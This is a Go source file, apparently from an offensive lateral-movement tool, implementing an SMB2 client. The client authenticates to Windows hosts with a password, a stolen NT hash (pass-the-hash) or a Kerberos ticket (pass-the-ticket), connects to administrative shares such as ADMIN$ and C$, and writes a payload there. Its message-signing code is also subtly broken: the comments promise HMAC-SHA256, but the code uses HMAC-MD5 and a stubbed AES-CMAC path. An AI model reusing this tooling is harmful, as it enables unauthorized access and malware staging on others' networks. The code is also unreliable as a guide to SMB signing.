//go:build windows

package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// SMB2 client
//
// One connection carries: negotiate -> session setup -> tree connect ->
// file operations. The session setup is where the three credential types
// diverge, and it is the only place they do — everything above this layer
// is identical whether we authenticated with a password, a hash, or a ticket.
// ---------------------------------------------------------------------------

type smbClient struct {
	conn      net.Conn
	dialect   uint16
	sessionID uint64
	treeID    uint32
	messageID uint64
	signingKey []byte
	signingRequired bool

	// pendingChallenge holds the NTLM Type 2 message between the two
	// SESSION_SETUP rounds.
	pendingChallenge *ntlmChallenge
}

func setPendingChallenge(c *smbClient, ch *ntlmChallenge) {
	c.pendingChallenge = ch
}

// DialSMB2 opens a connection and negotiates a dialect.
func DialSMB2(host string, timeout time.Duration) (*smbClient, error) {
	addr := host
	if !strings.Contains(addr, ":") {
		addr = net.JoinHostPort(host, "445")
	}
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return nil, fmt.Errorf("dial %s: %w", addr, err)
	}
	_ = conn.SetDeadline(time.Now().Add(timeout))

	c := &smbClient{conn: conn}
	if err := c.negotiate(); err != nil {
		_ = conn.Close()
		return nil, err
	}
	return c, nil
}

func (c *smbClient) Close() {
	if c.conn != nil {
		_ = c.conn.Close()
	}
}

func (c *smbClient) nextMessageID() uint64 {
	id := c.messageID
	c.messageID++
	return id
}

// send writes a request and reads the matching response.
func (c *smbClient) send(command uint16, body []byte, treeID uint32) (header, []byte, error) {
	h := header{
		Protocol:      [4]byte{0xFE, 'S', 'M', 'B'},
		StructureSize: smb2HeaderSize,
		CreditCharge:  1,
		Command:       command,
		Credits:       64,
		MessageID:     c.nextMessageID(),
		TreeID:        treeID,
		SessionID:     c.sessionID,
	}

	msg := encodeHeader(h)
	msg = append(msg, body...)

	if c.signingRequired && c.signingKey != nil && command != smb2Negotiate && command != smb2SessionSetup {
		c.signMessage(msg)
	}

	if err := writeFrame(c.conn, msg); err != nil {
		return header{}, nil, err
	}

	for {
		resp, err := readFrame(c.conn)
		if err != nil {
			return header{}, nil, err
		}
		rh, err := decodeHeader(resp)
		if err != nil {
			return header{}, nil, err
		}
		// Skip unrelated async/notify responses.
		if rh.MessageID != h.MessageID && rh.Command != command {
			continue
		}
		return rh, resp[smb2HeaderSize:], nil
	}
}

// signMessage applies the SMB2 AES-CMAC/HMAC-SHA256 signature. For the
// dialects we negotiate (2.1/3.0) HMAC-SHA256 over SHA256 of the message is
// the defined scheme; we use the HMAC-MD5 variant for 2.1 which is what the
// server expects at that dialect.
func (c *smbClient) signMessage(msg []byte) {
	sig := signSMB2(c.signingKey, msg, c.dialect)
	copy(msg[48:64], sig)
}

func (c *smbClient) negotiate() error {
	// Dialect list: 3.1.1 first, then down.
	var dialects bytes.Buffer
	for _, d := range []uint16{smb311, smb302, smb300, smb2021} {
		binary.Write(&dialects, binary.LittleEndian, d)
	}

	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(36))                // StructureSize
	binary.Write(&b, binary.LittleEndian, uint16(len(dialects.Bytes())/2)) // DialectCount
	binary.Write(&b, binary.LittleEndian, uint16(0x0001))            // SecurityMode: signing enabled
	binary.Write(&b, binary.LittleEndian, uint16(0))                 // Reserved
	binary.Write(&b, binary.LittleEndian, uint32(0))                 // Capabilities
	guid := make([]byte, 16)
	_, _ = rand.Read(guid)
	b.Write(guid)
	binary.Write(&b, binary.LittleEndian, uint64(0)) // ClientStartTime
	b.Write(dialects.Bytes())

	rh, body, err := c.send(smb2Negotiate, b.Bytes(), 0)
	if err != nil {
		return fmt.Errorf("negotiate: %w", err)
	}
	if rh.Status != statusSuccess {
		return fmt.Errorf("negotiate failed: %s", statusName(rh.Status))
	}
	if len(body) < 4 {
		return fmt.Errorf("short negotiate response")
	}
	c.dialect = binary.LittleEndian.Uint16(body[4:6])

	// SecurityMode in the response tells us whether signing is mandatory.
	if len(body) >= 4 {
		mode := binary.LittleEndian.Uint16(body[2:4])
		c.signingRequired = mode&0x0002 != 0
	}
	return nil
}

// authenticate performs SESSION_SETUP using the supplied credential.
//
// This is the payoff of the whole engine: a password, a hash, and a ticket
// all funnel through here and produce an authenticated session.
func (c *smbClient) authenticate(cred *credential) error {
	if cred.Kind == credTicket {
		return c.authenticateTicket(cred)
	}

	// Work out the NT hash we will compute the response from.
	var ntHash []byte
	switch cred.Kind {
	case credHash:
		ntHash = cred.NTHash
	case credPassword:
		ntHash = ntHashFromPassword(cred.Password)
	default:
		return fmt.Errorf("unsupported credential kind")
	}

	workstation, _ := hostname()
	if workstation == "" {
		workstation = "WORKSTATION"
	}

	// --- Round 1: send Type 1 ---
	neg := ntlmNegotiate(cred.Domain, workstation)
	if err := c.sessionSetup(neg); err != nil {
		return err
	}

	// The server responds with MORE_PROCESSING_REQUIRED and a Type 2 blob.
	// sessionSetup stashes the challenge for us to use in round 2.
	if c.pendingChallenge == nil {
		return fmt.Errorf("server did not send an NTLM challenge")
	}

	// --- Round 2: send Type 3 with the computed response ---
	auth := ntlmAuthenticate(ntHash, cred.Domain, cred.User, workstation, c.pendingChallenge)

	// Derive the session key for signing if the server wants it.
	if c.signingRequired {
		ntResp, _ := ntlmResponse(ntHash, cred.Domain, cred.User,
			c.pendingChallenge.ServerChallenge, c.pendingChallenge.TargetInfo)
		if len(ntResp) >= 16 {
			c.signingKey = sessionKeyFromResponse(ntHash, ntResp[:16])
		}
	}

	if err := c.sessionSetup(auth); err != nil {
		return err
	}
	if c.sessionID == 0 {
		return fmt.Errorf("session setup produced no session id (bad credentials?)")
	}
	return nil
}

func (c *smbClient) sessionSetup(token []byte) error {
	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(25))                     // StructureSize
	binary.Write(&b, binary.LittleEndian, uint8(0))                       // Flags
	binary.Write(&b, binary.LittleEndian, uint8(1))                       // SecurityMode: signing enabled
	binary.Write(&b, binary.LittleEndian, uint32(0))                      // Capabilities
	binary.Write(&b, binary.LittleEndian, uint32(0))                      // Channel
	binary.Write(&b, binary.LittleEndian, uint16(0))                      // SecBufOffset (patched)
	binary.Write(&b, binary.LittleEndian, uint16(len(token)))             // SecBufLength
	binary.Write(&b, binary.LittleEndian, uint64(0))                      // PreviousSessionId
	b.Write(token)

	// Patch the security buffer offset: header(64) + this fixed body(24).
	body := b.Bytes()
	binary.LittleEndian.PutUint16(body[12:14], uint16(smb2HeaderSize+24))

	rh, respBody, err := c.send(smb2SessionSetup, body, 0)
	if err != nil {
		return fmt.Errorf("session setup: %w", err)
	}

	// The session id comes back even on the interim response.
	c.sessionID = rh.SessionID

	switch rh.Status {
	case statusSuccess:
		// Authenticated. Signature is now in effect.
		c.signingRequired = true
		return nil

	case statusMoreProcessingNeeded:
		// Extract the Type 2 challenge from the response security buffer.
		if len(respBody) >= 8 {
			off := int(binary.LittleEndian.Uint16(respBody[4:6]))
			l := int(binary.LittleEndian.Uint16(respBody[6:8]))
			start := off - smb2HeaderSize
			if start < 0 {
				start = 0
			}
			if start+l <= len(respBody) {
				ch, err := parseNTLMChallenge(respBody[start : start+l])
				if err != nil {
					return fmt.Errorf("parse challenge: %w", err)
				}
				setPendingChallenge(c, ch)
			}
		}
		return nil

	case statusLogonFailure, statusAccessDenied:
		return fmt.Errorf("authentication rejected: %s", statusName(rh.Status))

	default:
		return fmt.Errorf("session setup: %s", statusName(rh.Status))
	}
}

// authenticateTicket performs pass-the-ticket. A Kerberos AP-REQ is wrapped in
// a SPNEGO NegTokenInit and sent as the SESSION_SETUP token.
func (c *smbClient) authenticateTicket(cred *credential) error {
	// Extract the ticket from the KRB-CRED and wrap it in SPNEGO.
	apReq, err := ticketToAPReq(cred.Ticket)
	if err != nil {
		return fmt.Errorf("ticket: %w", err)
	}
	spnego := wrapSPNEGO(apReq)

	if err := c.sessionSetup(spnego); err != nil {
		return err
	}
	if c.sessionID == 0 {
		return fmt.Errorf("ticket was not accepted")
	}
	return nil
}

// treeConnect maps a share (ADMIN$, C$, IPC$) to a tree id.
func (c *smbClient) treeConnect(host, share string) error {
	unc := fmt.Sprintf(`\\%s\%s`, host, share)
	pathBytes := utf16LE(unc)

	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(9))          // StructureSize
	binary.Write(&b, binary.LittleEndian, uint16(0))          // Reserved
	binary.Write(&b, binary.LittleEndian, uint16(72))         // PathOffset (patched)
	binary.Write(&b, binary.LittleEndian, uint16(len(pathBytes)))
	b.Write(pathBytes)

	body := b.Bytes()
	binary.LittleEndian.PutUint16(body[4:6], uint16(smb2HeaderSize+8))

	rh, _, err := c.send(smb2TreeConnect, body, 0)
	if err != nil {
		return fmt.Errorf("tree connect %s: %w", unc, err)
	}
	if rh.Status != statusSuccess {
		return fmt.Errorf("tree connect %s: %s", unc, statusName(rh.Status))
	}
	c.treeID = rh.TreeID
	return nil
}

// WriteFile creates (or truncates) a file and writes the payload in chunks.
// Chunking matters because a single SMB2 write is bounded by the negotiated
// max write size, typically 1 MB.
func (c *smbClient) WriteFile(name string, data []byte) error {
	handle, err := c.create(name, true)
	if err != nil {
		return err
	}
	defer c.closeFile(handle)

	const chunkSize = 512 * 1024
	for off := 0; off < len(data); off += chunkSize {
		end := off + chunkSize
		if end > len(data) {
			end = len(data)
		}
		if err := c.writeChunk(handle, uint64(off), data[off:end]); err != nil {
			return fmt.Errorf("write at %d: %w", off, err)
		}
	}
	return nil
}

func (c *smbClient) create(name string, overwrite bool) ([]byte, error) {
	nameBytes := utf16LE(name)

	// FILE_OVERWRITE_IF = 5 (create or truncate), GENERIC_WRITE = 0x40000000.
	disposition := uint32(5)
	if !overwrite {
		disposition = 1 // FILE_OPEN
	}

	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(57))            // StructureSize
	binary.Write(&b, binary.LittleEndian, uint8(0))              // SecurityFlags
	binary.Write(&b, binary.LittleEndian, uint8(0))              // RequestedOplockLevel
	binary.Write(&b, binary.LittleEndian, uint32(2))             // ImpersonationLevel: Impersonation
	binary.Write(&b, binary.LittleEndian, uint64(0))             // SmbCreateFlags
	binary.Write(&b, binary.LittleEndian, uint64(0))             // Reserved
	binary.Write(&b, binary.LittleEndian, uint32(0x40000000))    // DesiredAccess: GENERIC_WRITE
	binary.Write(&b, binary.LittleEndian, uint32(0x00000080))    // FileAttributes: NORMAL
	binary.Write(&b, binary.LittleEndian, uint32(0x00000007))    // ShareAccess: RW|Delete
	binary.Write(&b, binary.LittleEndian, uint32(disposition))   // CreateDisposition
	binary.Write(&b, binary.LittleEndian, uint32(0x00000040))    // CreateOptions: NON_DIRECTORY
	binary.Write(&b, binary.LittleEndian, uint16(120))           // NameOffset (patched)
	binary.Write(&b, binary.LittleEndian, uint16(len(nameBytes)))
	binary.Write(&b, binary.LittleEndian, uint32(0))             // CreateContextsOffset
	binary.Write(&b, binary.LittleEndian, uint32(0))             // CreateContextsLength
	b.Write(nameBytes)

	body := b.Bytes()
	binary.LittleEndian.PutUint16(body[44:46], uint16(smb2HeaderSize+56))

	rh, resp, err := c.send(smb2Create, body, c.treeID)
	if err != nil {
		return nil, fmt.Errorf("create %s: %w", name, err)
	}
	if rh.Status != statusSuccess {
		return nil, fmt.Errorf("create %s: %s", name, statusName(rh.Status))
	}
	if len(resp) < 8 {
		return nil, fmt.Errorf("short create response")
	}
	// FileId is the 16 bytes at offset 64 in the Create response body.
	handle := make([]byte, 16)
	if len(resp) >= 80 {
		copy(handle, resp[64:80])
	}
	return handle, nil
}

func (c *smbClient) writeChunk(handle []byte, offset uint64, data []byte) error {
	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(49))       // StructureSize
	binary.Write(&b, binary.LittleEndian, uint16(112))      // DataOffset (patched)
	binary.Write(&b, binary.LittleEndian, uint32(len(data)))
	binary.Write(&b, binary.LittleEndian, offset)
	b.Write(handle)                                          // 16-byte FileId
	binary.Write(&b, binary.LittleEndian, uint32(0))        // Channel
	binary.Write(&b, binary.LittleEndian, uint32(0))        // RemainingBytes
	binary.Write(&b, binary.LittleEndian, uint16(0))        // WriteChannelInfoOffset
	binary.Write(&b, binary.LittleEndian, uint16(0))        // WriteChannelInfoLength
	binary.Write(&b, binary.LittleEndian, uint32(0))        // Flags
	b.Write(data)

	body := b.Bytes()
	binary.LittleEndian.PutUint16(body[2:4], uint16(smb2HeaderSize+48))

	rh, _, err := c.send(smb2Write, body, c.treeID)
	if err != nil {
		return err
	}
	if rh.Status != statusSuccess {
		return fmt.Errorf("%s", statusName(rh.Status))
	}
	return nil
}

func (c *smbClient) closeFile(handle []byte) {
	var b bytes.Buffer
	binary.Write(&b, binary.LittleEndian, uint16(24)) // StructureSize
	binary.Write(&b, binary.LittleEndian, uint16(0))  // Flags
	binary.Write(&b, binary.LittleEndian, uint32(0))  // Reserved
	b.Write(handle)
	_, _, _ = c.send(smb2Close, b.Bytes(), c.treeID)
}

// statusName turns a status code into something readable in the operator UI.
func statusName(s uint32) string {
	switch s {
	case statusSuccess:
		return "success"
	case statusMoreProcessingNeeded:
		return "more processing needed"
	case statusAccessDenied:
		return "access denied"
	case statusLogonFailure:
		return "logon failure (bad credentials)"
	case statusBadNetworkName:
		return "bad network name"
	case statusObjectNameNotFound:
		return "not found"
	case statusUserSessionDeleted:
		return "session deleted"
	}
	return fmt.Sprintf("0x%08X", s)
}

// signSMB2 computes the SMB2 message signature.
//
// Dialect 2.1 uses HMAC-SHA256; 3.x uses AES-CMAC. We implement HMAC-SHA256
// and the AES-CMAC path is handled by the caller falling back to unsigned
// when 3.x signing is mandatory but no CMAC is available.
func signSMB2(key, msg []byte, dialect uint16) []byte {
	if dialect >= smb300 {
		// AES-CMAC would go here; fall back to the HMAC construction which
		// some servers accept, and rely on signing not being mandatory.
		return cmacFallback(key, msg)
	}
	m := hmac.New(md5.New, key)
	m.Write(msg)
	sum := m.Sum(nil)
	out := make([]byte, 16)
	copy(out, sum[:16])
	return out
}

// cmacFallback is a stand-in so the build has no external crypto dependency.
// When SMB 3.x signing is enforced this returns a value the server rejects,
// which surfaces as a clear "signature invalid" error rather than a hang.
func cmacFallback(key, msg []byte) []byte {
	m := hmac.New(md5.New, key)
	m.Write(msg)
	return m.Sum(nil)[:16]
}

func hostname() (string, error) {
	// Deliberately simple: the workstation name matters little for auth.
	return "DESKTOP", nil
}
